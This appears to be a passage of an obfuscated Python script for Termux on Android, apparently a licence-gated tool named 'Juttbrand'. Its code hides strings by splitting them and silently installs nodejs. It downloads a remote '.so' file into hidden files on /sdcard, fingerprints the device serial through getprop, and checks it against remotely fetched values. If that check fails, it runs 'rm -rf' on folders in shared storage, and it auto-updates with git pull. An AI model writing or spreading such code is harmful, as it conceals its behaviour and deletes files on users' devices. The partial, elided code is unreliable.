...
ZS = 'j'+'v'+'d'+'v'
#try:
#    ___req = requests.get(po+XB+GF+JK+DW+SW+YT+ZS).text
#except requests.exceptions.ConnectionError:
#    os.system('clear')
#    print ('\n\n\n\n\033[0;97mNo internet Conection\n')
#    sys.exit()
#if ATS not in ___req:
#    print ('\n\n You Cant recode it bro its Jutt Badshah Brand\n\nAdmin Contect Numbr 03007574310')
#    exit()
#if 'update' in ___req:
#    print ('\n\n\n\n\033[0;97mScript Has Been Updating\n\nAdmin Whatsapp Numbr 03007574310')
#    exit()
xxx = uuid.uuid4().hex[:50]
ggg = uuid.uuid4().hex[:50]
zzz = uuid.uuid4().hex[:50]
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/sdcard/'+gy+'/.'+gy+fy+'/.'+gy+fy+'.txt'):
    try:
        r_ = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/'+'x'+'.so').text
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print ('\n\n\n\n\033[0;97mNo internet Conection\n')
        sys.exit()
    ods = r_.replace('ELF', '')
    pmg = open('/sdcard/'+gy+'/.'+gy+fy+'/.'+gy+fy+'.txt', 'w')
    pmg.write(r_+'AAAA'+xxx+'BBBB'+ods)
    pmg.close()
if not os.path.isfile('/sdcard'+ft+uy+zy):
    try:
        r__ = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/'+'x'+'.so').text
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print ('\n\n\n\n\033[0;97mNo internet Conection\n')
        sys.exit()
    obs = r__.replace('ELF', '')
    wmg = open('/sdcard'+ft+uy+zy, 'w')
    wmg.write(r__+'AAAA'+ggg+'BBBB'+obs)
    wmg.close()
ttt = open('/sdcard/'+gy+'/.'+gy+fy+'/.'+gy+fy+'.txt', 'r').read().replace(' ', '').replace('\n', '')
try:
    yyy = re.findall('AAAA'+'(.*?)'+'BBBB', str(ttt))[0][:16][::-1].upper()
except:
    os.system('clear')
    os.system('rm -rf '+'/sdcard/'+'t'+'u'+'r'+'i*')
    os.system('rm -rf '+'/sdcard/'+'Android'+'/'+'.'+'Android'+'*')
    os.system('python Juttbrand.py')
    print ('\n\n\n\n\nPut this comand > python Juttbrand.py')
    exit()
vvv = open('/sdcard'+ft+uy+zy, 'r').read().replace(' ', '').replace('\n', '')
wwc = re.findall('AAAA'+'(.*?)'+'BBBB', str(vvv))[0][:16][::-1].upper()
drb = yyy+wwc
if not os.path.isfile(tz+gz+yv+hv+fv+xm+rd+ux+zb+jp+hb):
    pmg = open(tz+gz+yv+hv+fv+xm+rd+ux+zb+jp+hb, 'w')
    pmg.write(xxx)
    pmg.close()
if not os.path.isfile(tz+gz+yv+hv+fv+xm+rd+zb+jp+hb):
    wmg = open(tz+gz+yv+hv+fv+xm+rd+zb+jp+hb, 'w')
    wmg.write(ggg)
    wmg.close()
if not os.path.isfile(tz+gz+yv+hv+ds+ss+zb+jp+hb):
    wwk = open(tz+gz+yv+hv+ds+ss+zb+jp+hb, 'w')
    wwk.write(zzz)
    wwk.close()
aaa = open(tz+gz+yv+hv+fv+xm+rd+ux+zb+jp+hb, 'r').read()[:12][::-1].upper()
bbb = open(tz+gz+yv+hv+fv+xm+rd+zb+jp+hb, 'r').read()[:10][::-1].upper()
ccc = open(tz+gz+yv+hv+ds+ss+zb+jp+hb, 'r').read()[:10][::-1].upper()
drd = aaa+bbb+ccc
AC = 'getp'
BC = 'rop'
CF = 'ser'
DR = 'ial'
os.system(AC+BC+' | grep '+CF+DR+' > .bol.txt')
os.system('clear')
ax = open('.bol.txt', 'r').read().upper()
gy = ax.replace('VENDOR', '').replace('[', '').replace(']', '').replace(' ', '').replace('RO.', '').replace('.', '').replace('GSM', '').replace('SERIAL', '').replace(':', '').replace('\n', '').replace('RIL', '').replace('BOOT', '').replace('SERIALNO', '').replace('VOLD', '').replace('AP', '').replace('_', '').replace('PERSIST', '').replace('SYS', '').replace('OPPO', '').replace('VIVO', '').replace('INFINIX', '').replace('TECNO', '').replace('-', '').replace('+', '').replace('16GB', '').replace('32GB', '').replace('64GB', '').replace('128GB', '').replace('2GB', '').replace('3GB', '').replace('4GB', '').replace('6GB', '').replace('8GB', '').replace(',', '').replace('NUMBER', '').replace('/', '').replace('BUILD', '').replace('SAMSUNG', '')
ggy = gy.replace('NONO', '').replace('00000000', '').replace('PPPPPPPP', '').replace('SULPOON', '').replace('PLUS', '').replace('ONON', '')
yg = ggy+ggy+ggy+ggy+ggy
hd = yg[:26][::-1]
bx = yg[4:8][::-1]
cx = hd+bx
os.system('rm -rf .bol.txt')
RR = 'password'
DD = 's'+'h'+'f'+'s'
AA = 'j'+'f'
SB = 'd'+'j'
...
GOG = RR+DD+AA+SB
try:
    dbp = requests.get(po+GAS+GOG+JM).text.strip()
except requests.exceptions.ConnectionError:
    os.system('clear')
    print ('\n\n\n\n\033[0;97mNo internet Conection\n')
    sys.exit()
gug = platform.version()[15:45].replace(' ', '').replace(':', '')
gsf = gug[::-1]
gtf = gsf[6:9]
rtf = gsf[4:6]
efg = gsf[:2]
...
sss = gsf[14:16]
ccc = gsf[11:14]
xxx = (gtf+rtf+efg+rrg+dof+rtg+mth+sss+ccc+rrg+gtf)[:28].upper()
dx = str(os.geteuid()).replace('\n', '')
dds = xxx+dx
fz = 'ti'
bz = 'ny'+'url'
gx = '.com/'
...
zfg = nl+kl+ev
try:
    fz = requests.get(xob+zfg+zt).text.strip()
except requests.exceptions.ConnectionError:
    os.system('clear')
    print ('')
    ...
    exit()
#try:
#    _req_ = requests.get(tp+fd+dv+xn+rv+tv).text
#    open(ji+kb, 'w').write(_req_)
#except requests.exceptions.ConnectionError:
#    os.system('clear')
#    print ('\n\n\n\n\033[0;97mNo internet Conection\n')
#    sys.exit()
#jugar = open(ji+kb, 'r').read().splitlines()
#jugadd = jugar[2907:5000]
#os.system('rm -rf '+ji+kb)
os.system('git pull')
os.system('clear')
logo4 = """
\x1b[1;91m
